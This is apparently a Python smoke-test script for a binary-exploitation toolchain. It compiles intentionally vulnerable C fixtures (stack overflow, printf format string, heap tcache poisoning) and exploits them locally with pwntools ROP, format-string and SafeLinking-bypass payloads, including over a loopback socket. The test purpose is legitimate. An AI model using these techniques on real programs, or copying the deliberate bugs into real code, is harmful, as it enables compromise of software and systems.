#!/usr/bin/env python3
"""Offline known-answer smoke checks for the retained pwn toolchain."""

import hashlib
from importlib.metadata import version as package_version
import os
from pathlib import Path
import re
import resource
import shutil
import signal
import socketserver
import subprocess
import sys
import tempfile
import threading
import traceback
from typing import Sequence


MARKER = b"STACK_OK"
FORMAT_MARKER = b"FMT_OK"
HEAP_MARKER = b"HEAP_OK"
LIBC = Path("/usr/lib/x86_64-linux-gnu/libc.so.6")
LOADER = Path("/lib64/ld-linux-x86-64.so.2")
STACK_SOURCE = r"""
#include <unistd.h>

__attribute__((noinline)) void win(void) {
    static const char message[] = "STACK_OK\n";
    write(STDOUT_FILENO, message, sizeof(message) - 1);
    _exit(0);
}

__attribute__((noinline)) void vulnerable(void) {
    char buffer[32];
    read(STDIN_FILENO, buffer, 256);
}

int main(void) {
    vulnerable();
    return 0;
}
"""

FORMAT_SOURCE = r"""
#include <stdio.h>
#include <unistd.h>

unsigned int target;

int main(void) {
    char buffer[256];
    ssize_t count = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);
    if (count <= 0) {
        return 1;
    }
    buffer[count] = '\0';
    printf(buffer);
    if (target == 0x41424344U) {
        static const char message[] = "\nFMT_OK\n";
        write(STDOUT_FILENO, message, sizeof(message) - 1);
    }
    return 0;
}
"""

HEAP_SOURCE = r"""
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CHUNK_SIZE 0x80

__attribute__((aligned(16))) unsigned char target[16];

static void print_pointer(const char *name, const void *pointer) {
    printf("%s=%#lx\n", name, (unsigned long)(uintptr_t)pointer);
}

static int normal_chunks(void) {
    void *first = malloc(CHUNK_SIZE);
    void *second = malloc(CHUNK_SIZE);
    if (first == NULL || second == NULL) {
        return 2;
    }
    print_pointer("FIRST", first);
    print_pointer("SECOND", second);
    print_pointer("TARGET", target);
    free(first);
    free(second);
    void *reused = malloc(CHUNK_SIZE);
    if (reused == NULL) {
        return 2;
    }
    print_pointer("REUSED", reused);
    return 0;
}

static int poison_chunks(void) {
    void *first = malloc(CHUNK_SIZE);
    void *second = malloc(CHUNK_SIZE);
    if (first == NULL || second == NULL) {
        return 2;
    }
    print_pointer("FIRST", first);
    print_pointer("SECOND", second);
    print_pointer("TARGET", target);
    free(second);
    free(first);

    uintptr_t encoded_next = *(volatile uintptr_t *)first;
    printf("ENCODED_NEXT=%#lx\n", (unsigned long)encoded_next);
    *(volatile uintptr_t *)first = ((uintptr_t)first >> 12) ^ (uintptr_t)target;

    void *first_again = malloc(CHUNK_SIZE);
    void *poisoned = malloc(CHUNK_SIZE);
    if (first_again == NULL || poisoned == NULL) {
        return 2;
    }
    print_pointer("FIRST_AGAIN", first_again);
    print_pointer("POISONED", poisoned);
    if (poisoned == target) {
        static const char message[] = "HEAP_OK\n";
        write(STDOUT_FILENO, message, sizeof(message) - 1);
        return 0;
    }
    return 3;
}

static int double_free_chunks(void) {
    void *chunk = malloc(CHUNK_SIZE);
    if (chunk == NULL) {
        return 2;
    }
    free(chunk);
    free(chunk);
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        return 64;
    }
    if (strcmp(argv[1], "normal") == 0) {
        return normal_chunks();
    }
    if (strcmp(argv[1], "poison") == 0) {
        return poison_chunks();
    }
    if (strcmp(argv[1], "double-free") == 0) {
        return double_free_chunks();
    }
    return 64;
}
"""


class SmokeSkip(Exception):
    """A platform-version limitation that must produce a nonzero summary."""


def _run(
    args: Sequence[str],
    *,
    cwd: Path | None = None,
    input_data: bytes | None = None,
    timeout: float,
    clear_env: bool = False,
) -> subprocess.CompletedProcess[bytes]:
    env = {} if clear_env else os.environ.copy()
    env.update({"TERM": "xterm", "DEBUGINFOD_URLS": "", "DEBUGINFOD_PROGRESS": "0"})
    return subprocess.run(
        list(args),
        cwd=cwd,
        env=env,
        input=input_data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        check=False,
    )


def _text(data: bytes) -> str:
    return data.decode("utf-8", errors="replace")


def _require_success(result: subprocess.CompletedProcess[bytes], args: Sequence[str]) -> None:
    if result.returncode != 0:
        raise AssertionError(
            f"command {list(args)!r} exited {result.returncode}\n"
            f"stdout:\n{_text(result.stdout)}\nstderr:\n{_text(result.stderr)}"
        )


def _checked_run(args: Sequence[str], **kwargs: object) -> subprocess.CompletedProcess[bytes]:
    result = _run(args, **kwargs)  # type: ignore[arg-type]
    _require_success(result, args)
    return result


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(65536), b""):
            digest.update(block)
    return digest.hexdigest()


def build_fixtures(root: Path) -> dict[str, Path]:
    source = root / "stack.c"
    stack = root / "stack"
    source.write_text(STACK_SOURCE, encoding="utf-8")
    compile_args = [
        "gcc",
        "-O0",
        "-g",
        "-fno-stack-protector",
        "-fno-pie",
        "-no-pie",
        "-fno-omit-frame-pointer",
        "-Wl,-z,noexecstack",
        "-o",
        str(stack),
        str(source),
    ]
    _checked_run(compile_args, cwd=root, timeout=20)
    fixtures = {"stack": stack, "stack_source": source}
    for name, source_text in (("format_string", FORMAT_SOURCE), ("heap", HEAP_SOURCE)):
        fixture_source = root / f"{name}.c"
        fixture_binary = root / name
        fixture_source.write_text(source_text, encoding="utf-8")
        fixture_args = [
            "gcc",
            "-O0",
            "-g",
            "-fno-stack-protector",
            "-fno-pie",
            "-no-pie",
            "-fno-omit-frame-pointer",
            "-Wl,-z,noexecstack",
            "-o",
            str(fixture_binary),
            str(fixture_source),
        ]
        _checked_run(fixture_args, cwd=root, timeout=20)
        fixtures[name] = fixture_binary
        fixtures[f"{name}_source"] = fixture_source
    return fixtures


def check_toolchain(fixtures: dict[str, Path]) -> None:
    stack = fixtures["stack"]
    root = stack.parent

    file_args = ["file", str(stack)]
    file_output = _text(_checked_run(file_args, timeout=10).stdout)
    assert all(token in file_output for token in ("ELF 64-bit", "x86-64", "executable")), file_output

    readelf_args = ["readelf", "-hW", str(stack)]
    readelf_output = _text(_checked_run(readelf_args, timeout=10).stdout)
    assert re.search(r"Class:\s+ELF64", readelf_output), readelf_output
    assert re.search(r"Type:\s+EXEC", readelf_output), readelf_output
    assert re.search(r"Machine:.*X86-64", readelf_output), readelf_output

    checksec_args = ["checksec", f"--file={stack}"]
    checksec_result = _checked_run(checksec_args, timeout=15)
    checksec_output = _text(checksec_result.stdout + checksec_result.stderr)
    assert "No canary found" in checksec_output, checksec_output
    assert "NX enabled" in checksec_output, checksec_output
    assert "No PIE" in checksec_output, checksec_output

    interpreter_args = ["patchelf", "--print-interpreter", str(stack)]
    interpreter = _text(_checked_run(interpreter_args, timeout=10).stdout).strip()
    assert interpreter == str(LOADER), interpreter

    ropgadget_args = ["ROPgadget", "--binary", str(stack)]
    ropgadget_output = _text(_checked_run(ropgadget_args, timeout=20).stdout)
    assert "Unique gadgets found" in ropgadget_output, ropgadget_output
    assert re.search(r"0x[0-9a-f]+\s+:\s+ret\b", ropgadget_output), ropgadget_output

    ropper_args = ["ropper", "--file", str(stack), "--nocolor", "--search", "ret"]
    ropper_result = _checked_run(ropper_args, timeout=30)
    ropper_output = _text(ropper_result.stdout + ropper_result.stderr)
    assert re.search(r"0x[0-9a-f]+:\s+ret;", ropper_output), ropper_output

    normal_args = [str(stack)]
    normal = _checked_run(normal_args, input_data=b"short input\n", timeout=3, clear_env=True)
    assert MARKER not in normal.stdout + normal.stderr

    cyclic_args = ["cyclic", "128"]
    crash_pattern = _checked_run(cyclic_args, timeout=10).stdout.strip()
    assert len(crash_pattern) == 128, repr(crash_pattern)
    crash_input = root / "stack.crash"
    crash_input.write_bytes(crash_pattern)
    fixtures["crash_input"] = crash_input

    gdb_args = [
        "gdb",
        "-q",
        "-nx",
        "-batch",
        "-ex",
        "set pagination off",
        "-ex",
        "set debuginfod enabled off",
        "-ex",
        f"run < {crash_input}",
        "-ex",
        "info registers rip rsp",
        "-ex",
        "x/8gx $rsp-0x20",
        "--args",
        str(stack),
    ]
    gdb_result = _checked_run(gdb_args, cwd=root, timeout=25)
    gdb_output = _text(gdb_result.stdout + gdb_result.stderr)
    assert "Program received signal SIGSEGV" in gdb_output, gdb_output
    assert re.search(r"^rip\s+0x[0-9a-f]+", gdb_output, re.MULTILINE), gdb_output
    assert re.search(r"^rsp\s+0x[0-9a-f]+", gdb_output, re.MULTILINE), gdb_output
    gdb_evidence = root / "stack.gdb.txt"
    gdb_evidence.write_text(gdb_output, encoding="utf-8")
    fixtures["gdb_evidence"] = gdb_evidence

    original_hash = _sha256(stack)
    pwninit_dir = root / "pwninit"
    pwninit_dir.mkdir()
    copied_stack = pwninit_dir / stack.name
    shutil.copy2(stack, copied_stack)
    pwninit_args = [
        "pwninit",
        "--bin",
        str(copied_stack),
        "--libc",
        str(LIBC),
        "--ld",
        str(LOADER),
    ]
    _checked_run(pwninit_args, cwd=pwninit_dir, timeout=40)
    assert _sha256(stack) == original_hash, "pwninit modified the original fixture"
    assert _sha256(copied_stack) == original_hash, "pwninit modified its input copy"
    patched = pwninit_dir / f"{stack.name}_patched"
    assert patched.is_file(), f"missing patched copy: {patched}"
    patched_args = ["patchelf", "--print-interpreter", str(patched)]
    patched_interpreter = _text(_checked_run(patched_args, timeout=10).stdout).strip()
    assert patched_interpreter == str(LOADER), patched_interpreter

    one_gadget_args = ["one_gadget", str(LIBC)]
    one_gadget_output = _text(_checked_run(one_gadget_args, timeout=40).stdout)
    assert "execve" in one_gadget_output and "constraints" in one_gadget_output, one_gadget_output

    seccomp_args = ["seccomp-tools", "dump", "--help"]
    seccomp_output = _text(_checked_run(seccomp_args, timeout=15).stdout)
    assert "Usage: seccomp-tools dump" in seccomp_output, seccomp_output

    glibc_args = [str(LIBC)]
    glibc_output = _text(_checked_run(glibc_args, timeout=10).stdout)
    glibc_match = re.search(r"stable release version (\d+\.\d+)", glibc_output)
    assert glibc_match, glibc_output
    pwninit_version = _text(_checked_run(["pwninit", "--version"], timeout=10).stdout).strip()
    assert pwninit_version
    print(f"INFO glibc: {glibc_output.splitlines()[0]}", flush=True)
    print(f"INFO pwntools: {package_version('pwntools')}", flush=True)
    print(f"INFO {pwninit_version}", flush=True)

    socket_probe = (
        "import errno, socket\n"
        "try:\n"
        "    socket.socket()\n"
        "except PermissionError as exc:\n"
        "    assert exc.errno == errno.EPERM, exc.errno\n"
        "    print('SOCKET_EPERM')\n"
        "else:\n"
        "    raise SystemExit('socket unexpectedly succeeded')\n"
    )
    trace_path = root / "socket.strace"
    strace_args = [
        "strace",
        "-f",
        "-qq",
        "-o",
        str(trace_path),
        "-e",
        "trace=socket,socketcall",
        "--inject=socket:error=EPERM",
        "--inject=socketcall:error=EPERM",
        "python3",
        "-c",
        socket_probe,
    ]
    strace_result = _checked_run(strace_args, cwd=root, timeout=20)
    assert b"SOCKET_EPERM" in strace_result.stdout, _text(strace_result.stdout + strace_result.stderr)
    trace = trace_path.read_text(encoding="utf-8", errors="replace")
    assert "socket(" in trace and "EPERM" in trace and "INJECTED" in trace, trace


def check_stack(fixtures: dict[str, Path]) -> bytes:
    from pwn import ELF, ROP, context, cyclic, cyclic_find, p64

    stack = fixtures["stack"]
    context.clear(arch="amd64", os="linux")
    context.log_level = "error"
    elf = ELF(str(stack), checksec=False)
    crash_pattern = fixtures["crash_input"].read_bytes()
    assert crash_pattern == cyclic(128)

    evidence = fixtures["gdb_evidence"].read_text(encoding="utf-8")
    words = [int(value, 16) for value in re.findall(r"0x([0-9a-fA-F]{16})(?![0-9a-fA-F])", evidence)]
    offsets = {cyclic_find(p64(word)) for word in words}
    expected_offset = 32 + 8
    assert expected_offset in offsets, f"return offset {expected_offset} absent from gdb evidence:\n{evidence}"

    rop = ROP(elf)
    ret = rop.find_gadget(["ret"])
    assert ret is not None, "current ELF has no pwntools ret gadget"
    win = elf.symbols["win"]
    assert win, "current ELF has no win symbol"
    payload = cyclic(expected_offset) + p64(ret.address) + p64(win)
    assert payload[:expected_offset] == crash_pattern[:expected_offset]
    rop_input = stack.parent / "stack-rop.in"
    rop_input.write_bytes(payload)
    fixtures["stack_rop_input"] = rop_input

    normal = _checked_run([str(stack)], input_data=b"ordinary input\n", timeout=3, clear_env=True)
    assert MARKER not in normal.stdout + normal.stderr
    overflow = _run([str(stack)], input_data=b"A" * 128, timeout=3, clear_env=True)
    assert overflow.returncode != 0, "plain overflow unexpectedly returned normally"
    assert MARKER not in overflow.stdout + overflow.stderr

    exploited = _checked_run([str(stack)], input_data=payload, timeout=3, clear_env=True)
    assert exploited.stdout == MARKER + b"\n", repr(exploited.stdout)
    assert exploited.stdout.count(MARKER) == 1
    assert MARKER not in exploited.stderr
    print(
        f"INFO stack: offset={expected_offset} ret={ret.address:#x} "
        f"win={win:#x} payload_bytes={len(payload)}",
        flush=True,
    )
    return payload


def check_loopback(fixtures: dict[str, Path], payload: bytes) -> None:
    from pwn import context, remote

    context.log_level = "error"
    stack = fixtures["stack"]

    class StackServer(socketserver.TCPServer):
        def __init__(self) -> None:
            super().__init__(("127.0.0.1", 0), StackHandler)
            self.connections = 0
            self.peers: list[str] = []
            self.errors: list[str] = []

    class StackHandler(socketserver.BaseRequestHandler):
        def handle(self) -> None:
            server = self.server
            assert isinstance(server, StackServer)
            server.connections += 1
            server.peers.append(self.client_address[0])
            try:
                assert server.connections <= 3, "connection budget exceeded"
                process = subprocess.Popen(
                    [str(stack)],
                    cwd=stack.parent,
                    env={"TERM": "xterm", "DEBUGINFOD_URLS": "", "DEBUGINFOD_PROGRESS": "0"},
                    stdin=self.request,
                    stdout=self.request,
                    stderr=self.request,
                )
                try:
                    returncode = process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait(timeout=2)
                    raise
                assert returncode == 0, f"stack child exited {returncode}"
            except Exception:
                server.errors.append(traceback.format_exc())

    server = StackServer()
    server.timeout = 5
    thread = threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True)
    thread.start()
    port = server.server_address[1]

    def successful_connection() -> bytes:
        io = remote("127.0.0.1", port, timeout=2)
        try:
            io.send(payload)
            received = io.recvuntil(MARKER + b"\n", timeout=2)
            assert received == MARKER + b"\n", repr(received)
            assert received.count(MARKER) == 1
            try:
                extra = io.recv(timeout=2)
            except EOFError:
                pass
            else:
                raise AssertionError(f"server close not observed; recv returned {extra!r}")
            return received
        finally:
            io.close()

    try:
        first = remote("127.0.0.1", port, timeout=2)
        try:
            banner = first.recv(timeout=0.25)
            assert banner == b"", f"unexpected banner: {banner!r}"
            assert first.connected(), "no-banner connection closed instead of waiting"
        finally:
            first.close()

        first_success = successful_connection()
        second_success = successful_connection()
        assert first_success == second_success == MARKER + b"\n"
    except Exception as exc:
        if server.errors:
            raise AssertionError("loopback handler failure:\n" + "\n".join(server.errors)) from exc
        raise
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)

    assert not thread.is_alive(), "loopback server did not stop"
    assert not server.errors, "\n".join(server.errors)
    assert server.connections == 3, f"expected three loopback connections, got {server.connections}"
    assert server.peers == ["127.0.0.1"] * 3, server.peers
    print("INFO loopback: 3 local connections; timeout, EOF, and reconnect observed", flush=True)


def check_format_string(fixtures: dict[str, Path]) -> None:
    from pwn import ELF, context, fmtstr_payload

    format_binary = fixtures["format_string"]
    root = format_binary.parent
    context.clear(arch="amd64", os="linux")
    context.log_level = "error"
    elf = ELF(str(format_binary), checksec=False)

    normal = _checked_run([str(format_binary)], input_data=b"HELLO", timeout=3, clear_env=True)
    assert normal.stdout == b"HELLO", repr(normal.stdout)
    assert FORMAT_MARKER not in normal.stdout + normal.stderr

    marker = b"FMTMRK42"
    probe_input = marker + b"." + b"%p." * 24 + b"END"
    probe_input_path = root / "format-probe.in"
    probe_input_path.write_bytes(probe_input)
    fixtures["format_probe_input"] = probe_input_path
    probe = _checked_run([str(format_binary)], input_data=probe_input, timeout=3, clear_env=True)
    assert FORMAT_MARKER not in probe.stdout + probe.stderr
    probe_parts = probe.stdout.split(b".")
    assert probe_parts[0] == marker and probe_parts[-1] == b"END", repr(probe.stdout)
    arguments = probe_parts[1:-1]
    assert len(arguments) == 24, repr(arguments)
    marker_pointer = f"0x{int.from_bytes(marker, 'little'):x}".encode()
    matches = [index for index, value in enumerate(arguments, start=1) if value == marker_pointer]
    assert len(matches) == 1, f"format marker was not unique: {matches}; output={probe.stdout!r}"
    offset = matches[0]

    target_address = elf.symbols["target"]
    assert target_address, "current format-string ELF has no target symbol"
    payload = fmtstr_payload(
        offset,
        {target_address: 0x41424344},
        write_size="byte",
    )
    assert len(payload) < 256, f"format payload exceeds fixture input: {len(payload)}"
    write_input = root / "format-write.in"
    write_input.write_bytes(payload)
    fixtures["format_write_input"] = write_input
    exploited = _checked_run(
        [str(format_binary)], input_data=payload, timeout=3, clear_env=True,
    )
    assert exploited.stdout.count(FORMAT_MARKER) == 1, repr(exploited.stdout)
    assert FORMAT_MARKER not in exploited.stderr

    for label, output in (
        ("normal", normal.stdout),
        ("probe", probe.stdout),
        ("exploit", exploited.stdout),
    ):
        evidence = root / f"format-{label}.out"
        evidence.write_bytes(output)
        fixtures[f"format_{label}_evidence"] = evidence
    print(
        f"INFO format-string: offset={offset} target={target_address:#x} "
        f"value=0x41424344 write_size=byte payload_bytes={len(payload)}",
        flush=True,
    )


def supports_safelinking(version: tuple[int, int]) -> bool:
    return version >= (2, 32)


def check_heap(fixtures: dict[str, Path]) -> None:
    from pwn import ELF, context

    glibc_output = _text(_checked_run([str(LIBC)], timeout=10).stdout)
    glibc_match = re.search(r"stable release version (\d+)\.(\d+)", glibc_output)
    assert glibc_match, glibc_output
    glibc_version = (int(glibc_match.group(1)), int(glibc_match.group(2)))
    if not supports_safelinking(glibc_version):
        raise SmokeSkip(
            f"glibc {glibc_version[0]}.{glibc_version[1]} lacks SafeLinking; "
            "heap check requires glibc >= 2.32"
        )

    heap = fixtures["heap"]
    root = heap.parent
    context.clear(arch="amd64", os="linux")
    context.log_level = "error"
    elf = ELF(str(heap), checksec=False)
    target_address = elf.symbols["target"]
    assert target_address and target_address % 16 == 0, hex(target_address)

    def fields(output: bytes) -> dict[str, int]:
        return {
            key: int(value, 16)
            for key, value in re.findall(
                r"^([A-Z_]+)=(0x[0-9a-f]+)$", _text(output), re.MULTILINE,
            )
        }

    normal = _checked_run([str(heap), "normal"], timeout=3, clear_env=True)
    assert HEAP_MARKER not in normal.stdout + normal.stderr
    normal_fields = fields(normal.stdout)
    assert normal_fields["FIRST"] != normal_fields["SECOND"], normal_fields
    for name in ("FIRST", "SECOND", "REUSED", "TARGET"):
        assert normal_fields[name] % 16 == 0, (name, normal_fields)
    assert normal_fields["REUSED"] == normal_fields["SECOND"], normal_fields
    assert normal_fields["TARGET"] == target_address, normal_fields

    poisoned = _checked_run([str(heap), "poison"], timeout=3, clear_env=True)
    poisoned_fields = fields(poisoned.stdout)
    assert poisoned_fields["FIRST"] != poisoned_fields["SECOND"], poisoned_fields
    for name in ("FIRST", "SECOND", "FIRST_AGAIN", "POISONED", "TARGET"):
        assert poisoned_fields[name] % 16 == 0, (name, poisoned_fields)
    expected_encoded = (poisoned_fields["FIRST"] >> 12) ^ poisoned_fields["SECOND"]
    assert poisoned_fields["ENCODED_NEXT"] == expected_encoded, (
        poisoned_fields, hex(expected_encoded),
    )
    assert poisoned_fields["FIRST_AGAIN"] == poisoned_fields["FIRST"], poisoned_fields
    assert poisoned_fields["TARGET"] == target_address, poisoned_fields
    assert poisoned_fields["POISONED"] == target_address, poisoned_fields
    assert poisoned.stdout.count(HEAP_MARKER) == 1, repr(poisoned.stdout)
    assert HEAP_MARKER not in poisoned.stderr

    double_free = _run([str(heap), "double-free"], timeout=3, clear_env=True)
    double_free_diagnostic = _text(double_free.stderr)
    assert double_free.returncode == -signal.SIGABRT, (
        double_free.returncode, double_free_diagnostic,
    )
    assert "double free" in double_free_diagnostic.lower(), double_free_diagnostic
    assert HEAP_MARKER not in double_free.stdout + double_free.stderr

    for label, output in (
        ("normal", normal.stdout),
        ("poison", poisoned.stdout),
        ("double-free-stderr", double_free.stderr),
    ):
        evidence = root / f"heap-{label}.out"
        evidence.write_bytes(output)
        fixtures[f"heap_{label}_evidence"] = evidence
    diagnostic_line = next(
        line for line in double_free_diagnostic.splitlines() if "double free" in line.lower()
    )
    print(
        f"INFO heap: glibc={glibc_version[0]}.{glibc_version[1]} "
        f"first={poisoned_fields['FIRST']:#x} second={poisoned_fields['SECOND']:#x} "
        f"encoded_next={poisoned_fields['ENCODED_NEXT']:#x} target={target_address:#x}",
        flush=True,
    )
    print(f"INFO heap double-free: {diagnostic_line}", flush=True)


def result_exit_code(failures: int, skips: int) -> int:
    if failures:
        return 1
    if skips:
        return 2
    return 0


def main() -> int:
    failures = 0
    skips = 0
    try:
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        os.environ.update(
            {"TERM": "xterm", "DEBUGINFOD_URLS": "", "DEBUGINFOD_PROGRESS": "0"}
        )
        with tempfile.TemporaryDirectory(prefix="pwn-smoke-") as tmp:
            fixtures = build_fixtures(Path(tmp))
            payload: bytes | None = None
            for group in ("toolchain", "stack", "loopback", "format-string", "heap"):
                try:
                    if group == "toolchain":
                        check_toolchain(fixtures)
                    elif group == "stack":
                        payload = check_stack(fixtures)
                    elif group == "loopback":
                        if payload is None:
                            raise AssertionError("stack payload unavailable")
                        check_loopback(fixtures, payload)
                    elif group == "format-string":
                        check_format_string(fixtures)
                    else:
                        check_heap(fixtures)
                except SmokeSkip as exc:
                    skips += 1
                    print(f"SKIP {group}: {exc}", flush=True)
                except Exception:
                    failures += 1
                    print(f"FAIL {group}", flush=True)
                    traceback.print_exc()
                else:
                    print(f"PASS {group}", flush=True)
    except Exception:
        traceback.print_exc()
        return 1
    return result_exit_code(failures, skips)


if __name__ == "__main__":
    sys.exit(main())
